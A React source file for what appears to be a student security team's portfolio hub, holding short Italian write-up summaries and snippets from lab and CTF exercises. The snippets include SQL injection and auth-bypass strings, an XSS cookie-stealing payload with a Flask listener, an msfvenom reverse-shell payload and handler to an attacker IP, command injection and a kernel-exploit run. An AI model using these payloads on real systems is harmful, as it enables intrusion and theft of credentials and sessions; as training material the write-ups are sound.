// Case-study hub: pick which write-up to view from the HUB.
// Each project has its own short sample payload / snippet.

const WRITEUPS = {
  "day1": {
    kicker: "day 1 · sql-injection · dvwa",
    title: "Come si ruba una password con una frase",
    readTime: "~8 min",
    author: "LP",
    intro: "Una login form che non sanitizza l’input, una singola virgoletta al posto giusto, una query UNION per tirare fuori la tabella users e un MD5 passato a Hashcat. Dalla frase alla password in cinque passaggi — con mitigazioni concrete per il lato difensore: prepared statements, WAF signature e rate-limit sul login.",
    filename: "exploit.md",
    langStrip: "bash · sql · http",
    lines: [
      { k: "cmt",  t: "# 01 · Confirm injection point on the login form" },
      { k: "plain",t: "POST /login.php" },
      { k: "plain",t: "username=admin' -- &password=x   # → auth bypass ✓" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# 02 · Determine column count" },
      { k: "plain",t: "id=1' ORDER BY 2 -- -" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# 03 · UNION-based extraction of credentials table" },
      { k: "plain",t: "id=' UNION SELECT user, password FROM users #" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# 04 · Offline crack of the MD5 hash" },
      { k: "fn",   t: "$ hashcat -m 0 -a 0 creds.txt rockyou.txt" },
      { k: "cmt",  t: "→ admin:5f4dcc3b5aa765d61d8327deb882cf99  (password)" },
    ],
  },
  "day2": {
    kicker: "day 2 · xss · cookie theft · flask",
    title: "Come si ruba un cookie in tre atti",
    readTime: "~9 min",
    author: "CK",
    intro: "Riflesso, stored o DOM-based: il cookie cade comunque. Payload su DVWA, listener Python/Flask che intercetta la fuga, log CSV + JSONL, e alla fine un report con le mitigazioni: HttpOnly, SameSite, CSP.",
    filename: "cookie_catcher.py",
    langStrip: "python · flask",
    lines: [
      { k: "kw",   t: "from flask import Flask, request" },
      { k: "plain",t: "app = Flask(__name__)" },
      { k: "",     t: "" },
      { k: "fn",   t: "@app.route('/steal')" },
      { k: "plain",t: "def steal():" },
      { k: "plain",t: "    c = request.args.get('c', '')" },
      { k: "plain",t: "    open('logs/cookies.jsonl','a').write(c + '\\n')" },
      { k: "plain",t: "    return '', 204" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# payload: <script>fetch('/steal?c='+document.cookie)</script>" },
    ],
  },
  "day3": {
    kicker: "day 3 · buffer overflow · c · gdb",
    title: "Byte di troppo — scrivere sopra il ritorno",
    readTime: "~11 min",
    author: "WS",
    intro: "Due binari vulnerabili in C, `gets()` e amici. Input oltre il buffer, RIP sovrascritto, debugging con GDB per trovare l'offset esatto. Un menu interattivo per provare entrambi e un report passo-passo.",
    filename: "Bof_01.c",
    langStrip: "c · gdb",
    lines: [
      { k: "kw",   t: "#include <stdio.h>" },
      { k: "kw",   t: "#include <string.h>" },
      { k: "",     t: "" },
      { k: "fn",   t: "void vuln(char *in) {" },
      { k: "plain",t: "    char buf[64];" },
      { k: "plain",t: "    strcpy(buf, in);  // ← nessun bound check" },
      { k: "plain",t: "}" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# gdb: pattern_create 100 → crash → pattern_offset" },
      { k: "fn",   t: "$ ./bof_01 $(python -c 'print(\"A\"*72 + \"BBBB\")')" },
    ],
  },
  "day4": {
    kicker: "day 4 · samba · nessus · cve",
    title: "Samba: una porta aperta, due anni di ritardo",
    readTime: "~10 min",
    author: "DM",
    intro: "Recon del target con Nessus e Nmap, servizio Samba esposto con versione vulnerabile, CVE identificata e sfruttata con tool custom. Screenshot dell'intera kill-chain dentro al report.",
    filename: "recon.sh",
    langStrip: "shell · nmap · nessus",
    lines: [
      { k: "cmt",  t: "# 01 · Recon di superficie" },
      { k: "fn",   t: "$ nmap -sV -p 139,445 10.10.10.42" },
      { k: "plain",t: "  139/tcp open  netbios-ssn   Samba smbd 3.0.20" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# 02 · Scan Nessus · CVE match" },
      { k: "plain",t: "  CVE-2007-2447  Samba 'username map script' RCE" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# 03 · Exploit" },
      { k: "fn",   t: "$ msfconsole -q -x 'use exploit/multi/samba/usermap_script; …'" },
    ],
  },
  "day5": {
    kicker: "day 5 · metasploit · msfvenom · post-ex",
    title: "Metasploit come se fosse un mestiere",
    readTime: "~12 min",
    author: "LP",
    intro: "Dal modulo giusto al payload giusto: msfvenom, multi/handler, post-exploitation con meterpreter, persistenza e pivoting. Non 'hack the planet', ma un workflow riproducibile.",
    filename: "session.rc",
    langStrip: "metasploit · msfvenom",
    lines: [
      { k: "fn",   t: "$ msfvenom -p windows/x64/meterpreter_reverse_tcp \\" },
      { k: "plain",t: "    LHOST=10.10.14.7 LPORT=4444 -f exe -o payload.exe" },
      { k: "",     t: "" },
      { k: "kw",   t: "# handler.rc" },
      { k: "plain",t: "use exploit/multi/handler" },
      { k: "plain",t: "set PAYLOAD windows/x64/meterpreter_reverse_tcp" },
      { k: "plain",t: "set LHOST 10.10.14.7" },
      { k: "plain",t: "set LPORT 4444" },
      { k: "plain",t: "exploit -j" },
    ],
  },
  "ctf-jangow01": {
    kicker: "ctf extra · jangow01 · kernel exploit",
    title: "Jangow01 — da www-data a root",
    readTime: "~10 min",
    author: "GC",
    intro: "Gobuster per la directory nascosta, una RCE via parametro GET, shell bassa come www-data, poi un kernel vulnerabile e un exploit pubblico per guadagnare root. Flag raccolta e report consegnato.",
    filename: "walkthrough.md",
    langStrip: "gobuster · nmap · bash",
    lines: [
      { k: "cmt",  t: "# 01 · Discovery" },
      { k: "fn",   t: "$ gobuster dir -u http://10.10.10.7 -w common.txt" },
      { k: "plain",t: "  /site/wordpress  (200)" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# 02 · RCE via param `buscar`" },
      { k: "fn",   t: "$ curl \"http://…/busque.php?buscar=;id\"" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# 03 · Kernel exploit → root" },
      { k: "fn",   t: "$ gcc 45010.c -o pwn && ./pwn" },
      { k: "plain",t: "  uid=0(root)" },
    ],
  },
  "ctf-lupinone": {
    kicker: "ctf extra · lupinone · privesc",
    title: "Lupin One — scala i privilegi con calma",
    readTime: "~9 min",
    author: "CV",
    intro: "Network recon, servizio esposto, exploitation controllata e post-exploitation. Metasploit dove serve, shell manuale dove è più pulita. Report con screenshot e IOC.",
    filename: "notes.md",
    langStrip: "nmap · metasploit",
    lines: [
      { k: "cmt",  t: "# recon" },
      { k: "fn",   t: "$ nmap -sC -sV -oA lupinone 10.10.11.111" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# foothold + privesc" },
      { k: "plain",t: "- bruteforce SSH key passphrase (known offset)" },
      { k: "plain",t: "- sudo NOPASSWD on a binary → gtfobins → root" },
    ],
  },
  "ctf-epicodeharryp": {
    kicker: "ctf extra · harry potter · hard · 3 flags",
    title: "HarryP / EPICODE — tre bandiere, una notte",
    readTime: "~15 min",
    author: "AA",
    intro: "CTF livello difficile con tre bandiere: network recon, SQL injection, port knocking, privilege escalation e decriptaggio finale. Il Black Box pubblicato come write-up HTML.",
    filename: "black-box.md",
    langStrip: "sqli · knock · crypto",
    lines: [
      { k: "cmt",  t: "# flag 1 · SQLi nel form /admin" },
      { k: "plain",t: "' OR 1=1 -- -" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# flag 2 · port knocking → ssh aperto" },
      { k: "fn",   t: "$ knock 10.10.10.9 7000 8000 9000" },
      { k: "",     t: "" },
      { k: "cmt",  t: "# flag 3 · decriptaggio AES con chiave trovata in /tmp" },
      { k: "fn",   t: "$ openssl enc -d -aes-256-cbc -in flag.enc -k …" },
    ],
  },
  "ctf-riccio-pazzo": {
    kicker: "ctf extra · streamlit · openai · team-built",
    title: "Il Riccio Pazzo — una CTF che parla",
    readTime: "~6 min",
    author: "GC",
    intro: "Non l'abbiamo risolta, l'abbiamo costruita. Streamlit per la UI, OpenAI API per l'orchestrazione dei puzzle, logica CTF dietro. Bonus fuori brief — perché perché no.",
    filename: "Riccio2.py",
    langStrip: "python · streamlit · openai",
    lines: [
      { k: "kw",   t: "import streamlit as st" },
      { k: "kw",   t: "from openai import OpenAI" },
      { k: "",     t: "" },
      { k: "plain",t: "st.title('🦔 Il Riccio Pazzo')" },
      { k: "plain",t: "prompt = st.text_input('Risolvi l\\'enigma:')" },
      { k: "fn",   t: "client = OpenAI()" },
      { k: "fn",   t: "resp = client.chat.completions.create(…)" },
      { k: "plain",t: "if 'FLAG' in resp: st.success('✓ bandiera!')" },
    ],
  },
};

window.WRITEUPS = WRITEUPS;

function CodeBlock({ lines }) {
  const C = {
    cmt:   "text-slate-500",
    kw:    "text-sky-400",
    fn:    "text-emerald-400",
    str:   "text-amber-300",
    op:    "text-slate-400",
    plain: "text-slate-300",
  };
  return (
    <pre className="overflow-x-auto rounded-md border border-slate-800 bg-slate-950 p-4 font-mono text-[12px] leading-relaxed text-slate-300">
      {lines.map((l, i) => (
        <div key={i} className={C[l.k] || C.plain}>{l.t || "\u00A0"}</div>
      ))}
    </pre>
  );
}

function CaseStudyHub() {
  const list = PROJECTS.map(p => ({ ...p, writeup: WRITEUPS[p.slug] })).filter(p => p.writeup);
  const [activeSlug, setActiveSlug] = React.useState(
    (PROJECTS.find(p => p.featured) || list[0])?.slug
  );
  const active = list.find(p => p.slug === activeSlug) || list[0];

  return (
    <section>
      <div className="mb-3 flex items-end justify-between">
        <div>
          <SectionLabel>Case studies · HUB</SectionLabel>
          <h2 className="mt-0.5 text-[15px] font-semibold tracking-tight text-slate-100">
            Choose a write-up
          </h2>
        </div>
        <div className="flex items-center gap-2 font-mono text-[10px] text-slate-500">
          <Icon name="FileText" size={11} />
          {list.length} write-ups · internal · rev 03
        </div>
      </div>

      <div className="grid grid-cols-12 gap-4">
        {/* LEFT : picker */}
        <aside className="col-span-12 lg:col-span-4">
          <div className="overflow-hidden rounded-lg border border-slate-800 bg-slate-900">
            <div className="flex items-center justify-between border-b border-slate-800 px-3 py-2">
              <span className="font-mono text-[10px] uppercase tracking-widest text-slate-500">// archive</span>
              <span className="font-mono text-[10px] text-slate-600">{list.length} docs</span>
            </div>
            <ul className="max-h-[520px] overflow-y-auto">
              {list.map((p) => {
                const isActive = p.slug === activeSlug;
                return (
                  <li key={p.slug}>
                    <button
                      onClick={() => setActiveSlug(p.slug)}
                      className={`flex w-full items-start gap-3 border-b border-slate-800 px-3 py-2.5 text-left transition-colors last:border-b-0
                        ${isActive ? "bg-slate-800/70" : "hover:bg-slate-800/40"}`}
                    >
                      <span className={`mt-0.5 inline-block h-2 w-2 shrink-0 rounded-full ${isActive ? "bg-emerald-400 da-pulse-dot" : "bg-slate-700"}`} />
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center justify-between gap-2">
                          <span className={`font-mono text-[10px] ${isActive ? "text-emerald-400" : "text-slate-500"}`}>
                            DOC_ID: {p.id.replace("#","")}-{p.sec.split("_")[2]}
                          </span>
                          <ClassifiedStamp level={p.sec} />
                        </div>
                        <div className={`mt-1 truncate text-[12px] font-semibold ${isActive ? "text-slate-100" : "text-slate-200"}`}>
                          {p.writeup.title}
                        </div>
                        <div className="mt-0.5 truncate font-mono text-[10px] text-slate-500">
                          {p.writeup.kicker}
                        </div>
                      </div>
                      {isActive && <Icon name="ArrowRight" size={13} className="mt-1 text-emerald-400" />}
                    </button>
                  </li>
                );
              })}
            </ul>
          </div>
        </aside>

        {/* RIGHT : active write-up */}
        <article key={activeSlug} className="da-rise relative col-span-12 overflow-hidden rounded-lg border border-slate-800 bg-slate-900 lg:col-span-8">
          <div className="pointer-events-none absolute inset-x-0 top-0 h-[1px] bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent" />

          <div className="grid grid-cols-1 gap-0 xl:grid-cols-2">
            {/* LEFT */}
            <div className="flex flex-col p-6">
              <div className="flex items-center gap-2">
                <span className="inline-flex items-center gap-1.5 rounded-md bg-amber-500/10 px-2 py-0.5 font-mono text-[10px] uppercase tracking-widest text-amber-300 ring-1 ring-amber-500/25">
                  <Icon name="Star" size={10} /> Case study
                </span>
                <ClassifiedStamp level={active.sec} />
                <span className="font-mono text-[10px] text-slate-500">{active.id}</span>
              </div>

              <h3 className="mt-3 text-2xl font-semibold tracking-tight text-slate-100">
                {active.writeup.title}
              </h3>
              <p className="mt-1 font-mono text-[11px] text-emerald-400">
                // {active.writeup.kicker}
              </p>

              <p className="mt-4 max-w-prose text-[13px] leading-relaxed text-slate-400">
                {active.writeup.intro}
              </p>

              <div className="mt-5 flex flex-wrap items-center gap-1.5">
                {active.tags.map((t) => (
                  <span key={t} className="rounded border border-slate-800 bg-slate-800/40 px-1.5 py-0.5 font-mono text-[10px] text-slate-300">
                    {t}
                  </span>
                ))}
              </div>

              <div className="mt-auto flex items-center justify-between border-t border-slate-800 pt-4">
                <div className="flex items-center gap-2.5">
                  <Avatar initials={active.writeup.author} size={26} />
                  <div className="leading-tight">
                    <div className="text-[12px] text-slate-200">
                      {MEMBERS.find(m => m.initials === active.writeup.author)?.name || active.writeup.author}
                    </div>
                    <div className="font-mono text-[10px] text-slate-500">author · {active.writeup.readTime}</div>
                  </div>
                </div>

                <button className="inline-flex items-center gap-1.5 rounded-md bg-emerald-500/10 px-3 py-1.5 font-mono text-[12px] text-emerald-300 ring-1 ring-emerald-500/30 transition-colors hover:bg-emerald-500/15">
                  Open full file
                  <Icon name="ArrowRight" size={13} />
                </button>
              </div>
            </div>

            {/* RIGHT */}
            <div className="border-t border-slate-800 bg-slate-950/60 p-6 xl:border-l xl:border-t-0">
              <div className="flex items-center justify-between pb-3">
                <div className="flex items-center gap-2 font-mono text-[10px] text-slate-500">
                  <span className="inline-flex gap-1">
                    <span className="inline-block h-2.5 w-2.5 rounded-full bg-red-500/70" />
                    <span className="inline-block h-2.5 w-2.5 rounded-full bg-amber-400/70" />
                    <span className="inline-block h-2.5 w-2.5 rounded-full bg-emerald-500/70" />
                  </span>
                  {active.writeup.filename}
                </div>
                <span className="font-mono text-[10px] text-slate-600">{active.writeup.langStrip}</span>
              </div>
              <CodeBlock lines={active.writeup.lines} />
              <div className="mt-2 flex items-center justify-between font-mono text-[10px] text-slate-500">
                <span>payload validated {active.date} · 11:42 UTC</span>
                <span className="inline-flex items-center gap-1 text-emerald-400">
                  <Icon name="Check" size={11} /> reproducible
                </span>
              </div>
            </div>
          </div>
        </article>
      </div>
    </section>
  );
}

window.CaseStudyHub = CaseStudyHub;
